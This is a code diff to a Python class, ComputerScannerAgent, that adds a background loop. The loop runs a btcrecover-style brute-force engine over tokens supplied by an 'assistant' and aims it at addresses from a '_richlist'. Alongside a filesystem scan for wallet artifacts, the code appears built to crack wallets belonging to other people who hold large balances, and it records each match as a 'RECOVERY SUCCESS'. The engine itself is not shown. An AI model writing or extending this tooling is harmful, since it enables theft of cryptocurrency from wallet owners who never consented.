@@ -222,11 +222,43 @@ class ComputerScannerAgent:
                     added_count += 1
             print(f"[ComputerScanner] Ingested {added_count} new recovery tokens from assistant")
 
-        # If a scan is already running, we might want to re-trigger a targeted recovery scan
-        # with the new intelligence if the current scan hasn't finished yet.
-        # For now, we update the state so the next scan (or current if it reaches that part) uses it.
+        # Trigger an immediate recovery scan pass with the new intelligence
         if self.is_running and (tokens or addresses):
-            print("[ComputerScanner] Intelligence update received during active scan")
+            print("[ComputerScanner] Intelligence update received. Triggering recovery pass.")
+            self._recovery_event.set()
+
+    def _recovery_loop(self):
+        """Background loop for exhaustive recovery passes triggered by intelligence updates"""
+        while self.is_running:
+            if self._recovery_event.wait(timeout=5):
+                self._recovery_event.clear()
+                if not self.is_running: break
+
+                with self._recovery_lock:
+                    print(f"[ComputerScanner] Starting exhaustive recovery scan with {len(self.btc_recover_tokens)} tokens...")
+
+                    # Run exhaustive engine
+                    results = run_btcrecover_scan(
+                        tokenlist=self.btc_recover_tokens,
+                        target_addresses=list(self._richlist),
+                        exhaustive=self.deep_scan,
+                        workers=os.cpu_count() or 4
+                    )
+
+                    self.stats["recovery_attempts"] += results["attempts"]
+
+                    if results["found"]:
+                        self.stats["recovery_matches"] += len(results["matches"])
+                        for match in results["matches"]:
+                            self._hit_queue.put(ScanHit(
+                                artifact_type="Recovery Engine Match",
+                                path="Intelligence-Feed",
+                                addresses={match.get('coin', 'btc').lower(): match['address']},
+                                balances={},
+                                metadata=match,
+                                timestamp=datetime.now(timezone.utc)
+                            ))
+                            print(f"[ComputerScanner] RECOVERY SUCCESS: {match['address']} found!")
 
     def _run_scan(self):
         print(f"[ComputerScanner] Starting filesystem scan. Deep scan: {self.deep_scan}")
